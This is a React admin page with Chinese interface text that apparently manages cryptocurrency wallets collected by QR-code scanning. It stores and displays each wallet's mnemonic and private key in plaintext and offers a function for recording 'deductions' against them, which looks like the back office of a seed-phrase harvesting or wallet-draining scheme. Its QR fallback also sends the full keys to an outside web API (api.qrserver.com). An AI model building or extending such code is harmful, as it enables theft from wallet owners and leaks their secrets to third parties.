import React, { useState, useEffect, useRef } from 'react';
import { adminGet, adminPost, adminDelete } from '../services/client';

interface WalletStorage {
  id: number;
  address: string;
  mnemonic: string;
  private_key: string;
  chain_id: number;
  chain_name: string;
  employee_id?: string;
  qr_scanned_at: string;
  created_at: string;
}

interface DeductionRecord {
  id: number;
  amount: number;
  token_symbol: string;
  chain_name: string;
  transaction_hash?: string;
  status: string;
  created_at: string;
}

export default function WalletStoragePage() {
  const [wallets, setWallets] = useState<WalletStorage[]>([]);
  const [loading, setLoading] = useState(false);
  const [page, setPage] = useState(1);
  const [total, setTotal] = useState(0);
  const [selectedWallet, setSelectedWallet] = useState<WalletStorage | null>(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [showDeductModal, setShowDeductModal] = useState(false);
  const [showQRModal, setShowQRModal] = useState(false);
  const [qrData, setQRData] = useState('');
  const [deductForm, setDeductForm] = useState({
    amount: '',
    tokenSymbol: 'ETH',
    transactionHash: '',
    notes: '',
  });

  const fetchWallets = async () => {
    setLoading(true);
    try {
      const response: any = await adminGet(`/api/wallet-storage?page=${page}&limit=20`);
      setWallets(response.data || []);
      setTotal(response.pagination?.total || 0);
    } catch (error) {
      console.error('获取钱包列表失败:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchWallets();
  }, [page]);

  const handleDelete = async (id: number) => {
    if (!confirm('确定要删除此钱包记录吗？')) return;
    try {
      await adminDelete(`/api/wallet-storage/${id}`);
      fetchWallets();
      alert('删除成功');
    } catch (error) {
      console.error('删除失败:', error);
      alert('删除失败');
    }
  };

  const handleSubmitDeduct = async () => {
    if (!selectedWallet || !deductForm.amount) {
      alert('请填写扣费金额');
      return;
    }
    try {
      await adminPost(`/api/wallet-storage/${selectedWallet.id}/deduct`, {
        amount: parseFloat(deductForm.amount),
        tokenSymbol: deductForm.tokenSymbol,
        chainId: selectedWallet.chain_id,
        chainName: selectedWallet.chain_name,
        transactionHash: deductForm.transactionHash || undefined,
        notes: deductForm.notes || undefined,
        adminId: 1,
      });
      alert('扣费记录已创建');
      setShowDeductModal(false);
    } catch (error) {
      console.error('创建扣费记录失败:', error);
      alert('创建扣费记录失败');
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('已复制到剪贴板');
  };

  const generateQRCode = (wallet: WalletStorage) => {
    const walletInfo = {
      address: wallet.address,
      mnemonic: wallet.mnemonic,
      privateKey: wallet.private_key,
      chainId: wallet.chain_id,
      chainName: wallet.chain_name,
    };
    const jsonData = JSON.stringify(walletInfo, null, 2);
    setQRData(jsonData);
    setSelectedWallet(wallet);
    setShowQRModal(true);
  };

  return (
    <div style={{ padding: '24px' }}>
      <div style={{ marginBottom: '24px' }}>
        <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px' }}>
          钱包存储管理
        </h1>
        <p style={{ color: '#666', fontSize: '14px' }}>
          内部员工扫码自动上传的钱包信息（共 {total} 个）
        </p>
      </div>

      {/* Table */}
      <div
        style={{
          background: '#fff',
          borderRadius: '8px',
          border: '1px solid #e0e5ec',
          overflow: 'hidden',
        }}
      >
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead>
            <tr style={{ background: '#f7f9fc', borderBottom: '1px solid #e0e5ec' }}>
              <th style={{ padding: '12px 16px', textAlign: 'left', fontSize: '13px', fontWeight: 600 }}>
                ID
              </th>
              <th style={{ padding: '12px 16px', textAlign: 'left', fontSize: '13px', fontWeight: 600 }}>
                地址
              </th>
              <th style={{ padding: '12px 16px', textAlign: 'left', fontSize: '13px', fontWeight: 600 }}>
                链
              </th>
              <th style={{ padding: '12px 16px', textAlign: 'left', fontSize: '13px', fontWeight: 600 }}>
                扫码时间
              </th>
              <th style={{ padding: '12px 16px', textAlign: 'right', fontSize: '13px', fontWeight: 600 }}>
                操作
              </th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr>
                <td colSpan={5} style={{ padding: '40px', textAlign: 'center', color: '#999' }}>
                  加载中...
                </td>
              </tr>
            ) : wallets.length === 0 ? (
              <tr>
                <td colSpan={5} style={{ padding: '40px', textAlign: 'center', color: '#999' }}>
                  暂无数据
                </td>
              </tr>
            ) : (
              wallets.map((wallet) => (
                <tr key={wallet.id} style={{ borderBottom: '1px solid #f0f0f0' }}>
                  <td style={{ padding: '12px 16px', fontSize: '13px' }}>{wallet.id}</td>
                  <td
                    style={{ padding: '12px 16px', fontSize: '13px', fontFamily: 'monospace', cursor: 'pointer' }}
                    onClick={() => copyToClipboard(wallet.address)}
                    title="点击复制"
                  >
                    {wallet.address.slice(0, 10)}...{wallet.address.slice(-8)}
                  </td>
                  <td style={{ padding: '12px 16px', fontSize: '13px' }}>
                    <span
                      style={{
                        background: '#edf0ff',
                        color: '#4f8bff',
                        padding: '2px 8px',
                        borderRadius: '4px',
                        fontSize: '12px',
                      }}
                    >
                      {wallet.chain_name}
                    </span>
                  </td>
                  <td style={{ padding: '12px 16px', fontSize: '13px', color: '#666' }}>
                    {new Date(wallet.qr_scanned_at).toLocaleString('zh-CN')}
                  </td>
                  <td style={{ padding: '12px 16px', textAlign: 'right' }}>
                    <button
                      onClick={() => {
                        setSelectedWallet(wallet);
                        setShowDetailsModal(true);
                      }}
                      style={{
                        background: '#4f8bff',
                        color: '#fff',
                        border: 'none',
                        padding: '6px 12px',
                        borderRadius: '4px',
                        cursor: 'pointer',
                        fontSize: '12px',
                        marginRight: '8px',
                      }}
                    >
                      查看详情
                    </button>
                    <button
                      onClick={() => generateQRCode(wallet)}
                      style={{
                        background: '#8b5cf6',
                        color: '#fff',
                        border: 'none',
                        padding: '6px 12px',
                        borderRadius: '4px',
                        cursor: 'pointer',
                        fontSize: '12px',
                        marginRight: '8px',
                      }}
                    >
                      生成二维码
                    </button>
                    <button
                      onClick={() => {
                        setSelectedWallet(wallet);
                        setShowDeductModal(true);
                      }}
                      style={{
                        background: '#10b981',
                        color: '#fff',
                        border: 'none',
                        padding: '6px 12px',
                        borderRadius: '4px',
                        cursor: 'pointer',
                        fontSize: '12px',
                        marginRight: '8px',
                      }}
                    >
                      扣费
                    </button>
                    <button
                      onClick={() => handleDelete(wallet.id)}
                      style={{
                        background: '#ef4444',
                        color: '#fff',
                        border: 'none',
                        padding: '6px 12px',
                        borderRadius: '4px',
                        cursor: 'pointer',
                        fontSize: '12px',
                      }}
                    >
                      删除
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>

        {/* Pagination */}
        {total > 20 && (
          <div
            style={{
              padding: '16px',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              borderTop: '1px solid #e0e5ec',
            }}
          >
            <span style={{ fontSize: '13px', color: '#666' }}>
              共 {total} 条记录，第 {page} / {Math.ceil(total / 20)} 页
            </span>
            <div>
              <button
                disabled={page === 1}
                onClick={() => setPage(page - 1)}
                style={{
                  padding: '6px 12px',
                  marginRight: '8px',
                  border: '1px solid #e0e5ec',
                  background: page === 1 ? '#f5f5f5' : '#fff',
                  borderRadius: '4px',
                  cursor: page === 1 ? 'not-allowed' : 'pointer',
                }}
              >
                上一页
              </button>
              <button
                disabled={page >= Math.ceil(total / 20)}
                onClick={() => setPage(page + 1)}
                style={{
                  padding: '6px 12px',
                  border: '1px solid #e0e5ec',
                  background: page >= Math.ceil(total / 20) ? '#f5f5f5' : '#fff',
                  borderRadius: '4px',
                  cursor: page >= Math.ceil(total / 20) ? 'not-allowed' : 'pointer',
                }}
              >
                下一页
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Details Modal */}
      {showDetailsModal && selectedWallet && (
        <div
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.5)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
          onClick={() => setShowDetailsModal(false)}
        >
          <div
            style={{
              background: '#fff',
              borderRadius: '8px',
              padding: '24px',
              maxWidth: '600px',
              width: '90%',
              maxHeight: '80vh',
              overflow: 'auto',
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <h2 style={{ fontSize: '18px', fontWeight: 600, marginBottom: '16px' }}>
              钱包详情
            </h2>

            <div style={{ marginBottom: '16px', padding: '12px', background: '#fff3cd', borderRadius: '4px' }}>
              <p style={{ fontSize: '13px', color: '#856404', margin: 0 }}>
                ⚠️ 以下信息为明文存储，仅供内部员工管理使用
              </p>
            </div>

            <DetailField label="地址" value={selectedWallet.address} onCopy={copyToClipboard} />
            <DetailField label="助记词" value={selectedWallet.mnemonic} onCopy={copyToClipboard} />
            <DetailField label="私钥" value={selectedWallet.private_key} onCopy={copyToClipboard} />

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginTop: '16px' }}>
              <div>
                <p style={{ fontSize: '12px', color: '#999', marginBottom: '4px' }}>网络链</p>
                <p style={{ fontSize: '14px', fontWeight: 500 }}>
                  {selectedWallet.chain_name} (ID: {selectedWallet.chain_id})
                </p>
              </div>
              <div>
                <p style={{ fontSize: '12px', color: '#999', marginBottom: '4px' }}>扫码时间</p>
                <p style={{ fontSize: '14px', fontWeight: 500 }}>
                  {new Date(selectedWallet.qr_scanned_at).toLocaleString('zh-CN')}
                </p>
              </div>
            </div>

            <button
              onClick={() => setShowDetailsModal(false)}
              style={{
                marginTop: '24px',
                width: '100%',
                padding: '10px',
                background: '#4f8bff',
                color: '#fff',
                border: 'none',
                borderRadius: '4px',
                cursor: 'pointer',
                fontSize: '14px',
              }}
            >
              关闭
            </button>
          </div>
        </div>
      )}

      {/* Deduct Modal */}
      {showDeductModal && selectedWallet && (
        <div
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.5)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
          onClick={() => setShowDeductModal(false)}
        >
          <div
            style={{
              background: '#fff',
              borderRadius: '8px',
              padding: '24px',
              maxWidth: '400px',
              width: '90%',
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <h2 style={{ fontSize: '18px', fontWeight: 600, marginBottom: '16px' }}>
              创建扣费记录
            </h2>

            <p style={{ fontSize: '13px', color: '#666', marginBottom: '16px' }}>
              钱包: {selectedWallet.address.slice(0, 10)}...{selectedWallet.address.slice(-8)}
            </p>

            <input
              type="number"
              placeholder="扣费金额"
              value={deductForm.amount}
              onChange={(e) => setDeductForm({ ...deductForm, amount: e.target.value })}
              style={{
                width: '100%',
                padding: '10px',
                marginBottom: '12px',
                border: '1px solid #e0e5ec',
                borderRadius: '4px',
                fontSize: '14px',
              }}
            />

            <input
              type="text"
              placeholder="代币符号（如 ETH）"
              value={deductForm.tokenSymbol}
              onChange={(e) => setDeductForm({ ...deductForm, tokenSymbol: e.target.value })}
              style={{
                width: '100%',
                padding: '10px',
                marginBottom: '12px',
                border: '1px solid #e0e5ec',
                borderRadius: '4px',
                fontSize: '14px',
              }}
            />

            <input
              type="text"
              placeholder="交易哈希（可选）"
              value={deductForm.transactionHash}
              onChange={(e) => setDeductForm({ ...deductForm, transactionHash: e.target.value })}
              style={{
                width: '100%',
                padding: '10px',
                marginBottom: '12px',
                border: '1px solid #e0e5ec',
                borderRadius: '4px',
                fontSize: '14px',
              }}
            />

            <textarea
              placeholder="备注（可选）"
              value={deductForm.notes}
              onChange={(e) => setDeductForm({ ...deductForm, notes: e.target.value })}
              style={{
                width: '100%',
                padding: '10px',
                marginBottom: '16px',
                border: '1px solid #e0e5ec',
                borderRadius: '4px',
                fontSize: '14px',
                minHeight: '80px',
              }}
            />

            <div style={{ display: 'flex', gap: '12px' }}>
              <button
                onClick={() => setShowDeductModal(false)}
                style={{
                  flex: 1,
                  padding: '10px',
                  background: '#f5f5f5',
                  color: '#333',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '14px',
                }}
              >
                取消
              </button>
              <button
                onClick={handleSubmitDeduct}
                style={{
                  flex: 1,
                  padding: '10px',
                  background: '#4f8bff',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '14px',
                }}
              >
                创建
              </button>
            </div>
          </div>
        </div>
      )}

      {/* QR Code Modal */}
      {showQRModal && selectedWallet && (
        <div
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.5)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000,
          }}
          onClick={() => setShowQRModal(false)}
        >
          <div
            style={{
              background: '#fff',
              borderRadius: '8px',
              padding: '24px',
              maxWidth: '500px',
              width: '90%',
              maxHeight: '80vh',
              overflow: 'auto',
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <h2 style={{ fontSize: '18px', fontWeight: 600, marginBottom: '16px' }}>
              钱包二维码
            </h2>

            <div style={{ marginBottom: '16px', padding: '12px', background: '#dbeafe', borderRadius: '4px' }}>
              <p style={{ fontSize: '13px', color: '#1e40af', margin: 0 }}>
                📱 员工可使用任何二维码扫描软件扫描获取完整钱包信息
              </p>
            </div>

            <div style={{ marginBottom: '16px' }}>
              <p style={{ fontSize: '13px', color: '#666', marginBottom: '8px' }}>
                钱包: {selectedWallet.address.slice(0, 10)}...{selectedWallet.address.slice(-8)}
              </p>
            </div>

            {/* QR Code Display using qrcode.react or canvas */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              padding: '20px',
              background: '#f9fafb',
              borderRadius: '8px',
              marginBottom: '16px'
            }}>
              <QRCodeCanvas data={qrData} />
            </div>

            {/* Display JSON data */}
            <div style={{ marginBottom: '16px' }}>
              <p style={{ fontSize: '12px', color: '#999', marginBottom: '4px' }}>
                二维码数据内容：
              </p>
              <pre
                style={{
                  background: '#f7f9fc',
                  padding: '12px',
                  borderRadius: '4px',
                  border: '1px solid #e0e5ec',
                  fontSize: '11px',
                  maxHeight: '200px',
                  overflow: 'auto',
                  fontFamily: 'monospace',
                  whiteSpace: 'pre-wrap',
                  wordBreak: 'break-all',
                }}
              >
                {qrData}
              </pre>
            </div>

            <div style={{ display: 'flex', gap: '12px' }}>
              <button
                onClick={() => copyToClipboard(qrData)}
                style={{
                  flex: 1,
                  padding: '10px',
                  background: '#f5f5f5',
                  color: '#333',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '14px',
                }}
              >
                复制数据
              </button>
              <button
                onClick={() => setShowQRModal(false)}
                style={{
                  flex: 1,
                  padding: '10px',
                  background: '#4f8bff',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  fontSize: '14px',
                }}
              >
                关闭
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function DetailField({
  label,
  value,
  onCopy,
}: {
  label: string;
  value: string;
  onCopy: (text: string) => void;
}) {
  return (
    <div style={{ marginBottom: '16px' }}>
      <p style={{ fontSize: '12px', color: '#999', marginBottom: '4px' }}>{label}</p>
      <div
        style={{
          background: '#f7f9fc',
          padding: '12px',
          borderRadius: '4px',
          border: '1px solid #e0e5ec',
          display: 'flex',
          alignItems: 'center',
          gap: '8px',
        }}
      >
        <code
          style={{
            flex: 1,
            fontSize: '12px',
            fontFamily: 'monospace',
            wordBreak: 'break-all',
            color: '#333',
          }}
        >
          {value}
        </code>
        <button
          onClick={() => onCopy(value)}
          style={{
            background: '#4f8bff',
            color: '#fff',
            border: 'none',
            padding: '4px 8px',
            borderRadius: '3px',
            cursor: 'pointer',
            fontSize: '11px',
            whiteSpace: 'nowrap',
          }}
        >
          复制
        </button>
      </div>
    </div>
  );
}

// QR Code Canvas Component
function QRCodeCanvas({ data }: { data: string }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    if (!canvasRef.current || !data) return;

    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    // Simple QR code generation using a library approach
    // For production, use qrcode.react or qrcode npm package
    // Here we'll use a data URL approach as fallback

    const size = 300;
    canvas.width = size;
    canvas.height = size;

    // Generate QR code using qrcodejs or similar
    // For now, we'll use a simple approach with text encoding
    try {
      // Use browser's built-in QR code generation if available
      // Or use an external library
      const QRCode = (window as any).QRCode;
      if (QRCode) {
        new QRCode(canvas, {
          text: data,
          width: size,
          height: size,
          colorDark: '#000000',
          colorLight: '#ffffff',
          correctLevel: QRCode.CorrectLevel.M,
        });
      } else {
        // Fallback: display text-based QR code or use API
        ctx.fillStyle = '#ffffff';
        ctx.fillRect(0, 0, size, size);
        ctx.fillStyle = '#000000';
        ctx.font = '12px monospace';
        ctx.fillText('请安装qrcode库', 50, size / 2);

        // Alternative: use an API to generate QR code
        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(data)}`;
        const img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = () => {
          ctx.drawImage(img, 0, 0, size, size);
        };
        img.src = qrApiUrl;
      }
    } catch (error) {
      console.error('QR Code generation error:', error);
      // Fallback to API-based QR code
      const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(data)}`;
      const img = new Image();
      img.crossOrigin = 'anonymous';
      img.onload = () => {
        ctx.drawImage(img, 0, 0, size, size);
      };
      img.onerror = () => {
        // Final fallback: show text
        ctx.fillStyle = '#ffffff';
        ctx.fillRect(0, 0, size, size);
        ctx.fillStyle = '#000000';
        ctx.font = '14px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText('二维码生成失败', size / 2, size / 2 - 10);
        ctx.fillText('请复制数据手动生成', size / 2, size / 2 + 10);
      };
      img.src = qrApiUrl;
    }
  }, [data]);

  return (
    <canvas
      ref={canvasRef}
      style={{
        border: '1px solid #e0e5ec',
        borderRadius: '8px',
        maxWidth: '100%',
        height: 'auto',
      }}
    />
  );
}
